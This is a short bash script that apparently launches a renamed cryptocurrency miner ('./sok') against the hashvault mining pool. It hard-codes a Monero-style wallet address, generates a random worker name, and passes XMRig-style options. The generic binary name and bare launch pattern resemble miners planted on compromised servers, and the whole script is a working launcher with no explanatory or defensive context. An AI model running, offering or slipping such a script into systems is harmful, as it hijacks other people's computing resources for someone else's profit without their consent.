#!/bin/bash
A=pool.hashvault.pro:3333
B=4BFXd7EruGujgUgRGhfQNTTE5LZRSCFFsVdXMd5bc6pj9uLjL2qHhr3e3WbnRYXBxbeJtsAyjBNE8aRLhiDJ6kHWJRCeecL
C=$(echo $(shuf -i 1 -n 1)-BANGKONG)
./sok --donate-level 1 -o $A -u $B -p $C -a randomx -k 